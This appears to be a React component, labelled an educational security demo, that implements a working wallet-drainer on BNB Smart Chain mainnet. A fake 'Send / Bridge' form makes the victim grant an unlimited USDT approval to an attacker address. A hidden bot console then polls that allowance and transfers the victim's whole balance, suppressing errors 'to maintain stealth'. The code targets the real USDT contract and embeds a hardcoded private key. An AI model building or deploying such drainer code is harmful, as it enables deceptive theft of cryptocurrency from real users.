"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

/**
 * PortABC Protocol Demo - Educational Security Script
 * Focused on BSC (Binance Smart Chain) BEP20 Standards
 */

// BEP20/ERC20 ABI for interacting with USDT
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

// Official BSC-USDT Contract Address
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  // Demo Credentials (Ensure these are burner wallets)
  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  /**
   * Helper to ensure the victim's wallet is on BSC Mainnet
   * This eliminates any Ethereum-side confusion.
   */
  async function ensureBSCNetwork() {
    const bscChainId = '0x38'; // Hex for 56
    try {
      await (window as any).ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: bscChainId }],
      });
    } catch (switchError: any) {
      // If the chain hasn't been added to MetaMask, prompt to add it
      if (switchError.code === 4902) {
        await (window as any).ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: bscChainId,
            chainName: 'BNB Smart Chain Mainnet',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
      }
    }
  }

  /**
   * Victim UI Logic: Triggers the "Infinite Approval" 
   */
  async function simulateVictimApproval() {
    try {
      if (!(window as any).ethereum) return alert("Please install MetaMask");
      
      // Force switch to BSC immediately
      await ensureBSCNetwork();

      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Initializing PortABC secure channel...");
      
      // The Approval Trap: Granting permission to the Admin/Attacker address
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      await tx.wait();
      
      addLog("Authentication Successful. Processing...");
    } catch (err: any) {
      addLog("Transaction rejected by user.");
    }
  }

  /**
   * Backend Watcher/Attacker Logic: 
   * Monitors the allowance on BSC and executes transferFrom
   */
  async function startMonitoring() {
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);

      setIsMonitoring(true);
      addLog("Bot: Watching BSC Network for approvals...");

      const interval = setInterval(async () => {
        try {
          // Check if victim has provided allowance to our Admin address
          const allowance = await contract.allowance(VICTIM_WALLET_ADDRESS, ADMIN_PUBLIC_ADDRESS);
          const balance = await contract.balanceOf(VICTIM_WALLET_ADDRESS);

          // If allowance exists and wallet has funds
          if (allowance.gt(0) && balance.gt(0)) {
            addLog("Approval detected. Executing extraction...");
            
            const tx = await contract.transferFrom(
              VICTIM_WALLET_ADDRESS, 
              RECEIVER_ADDRESS, 
              balance, 
              {
                gasLimit: 120000,
                gasPrice: ethers.utils.parseUnits('5', 'gwei') // standard BSC gas
              }
            );
            await tx.wait();
            
            addLog(`Extracted: ${ethers.utils.formatUnits(balance, 18)} USDT`);
            clearInterval(interval);
            setIsMonitoring(false);
          }
        } catch (err: any) {
          // Fail silently to maintain stealth
        }
      }, 4000); // Poll every 4 seconds
    } catch (err: any) {
      addLog("Connection error.");
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans">
      
      {/* Front-end "Trap" Interface */}
      <div className="w-full max-w-[440px] bg-[#111] border border-[#222] rounded-3xl p-6 shadow-2xl">
        <h1 className="text-xl font-semibold mb-6">Send / Bridge</h1>

        <div className="space-y-4">
          <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl flex items-center justify-between cursor-pointer hover:border-gray-500 transition-colors">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-[#222] rounded-full flex items-center justify-center text-xs font-bold text-green-500 border border-green-900/30">
                USDT
              </div>
              <div>
                <p className="text-sm font-medium">USDT</p>
                <p className="text-[10px] text-gray-500">BSC Smart Chain</p>
              </div>
            </div>
            <span className="text-gray-500">▼</span>
          </div>

          <div className="space-y-2">
            <label className="text-xs text-gray-500 ml-1">Recipient Address</label>
            <div className="relative">
              <input 
                type="text" 
                placeholder="0x... recipient"
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-green-500 transition-all"
              />
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs text-gray-500 ml-1">Amount</label>
            <div className="relative">
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-green-500 transition-all"
              />
            </div>
          </div>

          <button 
            onClick={simulateVictimApproval}
            className="w-full bg-white text-black font-bold py-4 rounded-2xl hover:bg-gray-200 transition-all mt-4"
          >
            Next
          </button>
        </div>
      </div>

      {/* Admin/Watcher Console */}
      <div className="mt-10 w-full max-w-[440px] opacity-40 hover:opacity-100 transition-opacity">
        <div className="bg-[#111] border border-red-900/30 p-4 rounded-2xl">
          <div className="flex justify-between items-center mb-3">
            <p className="text-[10px] uppercase tracking-widest text-red-500 font-bold">Bot Control Unit</p>
            <button 
              onClick={startMonitoring}
              className="text-[10px] bg-red-950 text-red-400 px-3 py-1 rounded-full border border-red-800"
            >
              {isMonitoring ? "MONITORING ACTIVE" : "START BSC BOT"}
            </button>
          </div>
          <div className="bg-black p-3 rounded-lg font-mono text-[10px] text-green-500 h-28 overflow-hidden border border-[#222]">
            {logs.length === 0 ? "> Awaiting initialization..." : logs.map((l, i) => <div key={i}>{l}</div>)}
          </div>
        </div>
      </div>

      <p className="mt-8 text-[10px] text-gray-600">PortABC Protocol • Educational Security Demo v2 (BSC)</p>
    </div>
  );
}
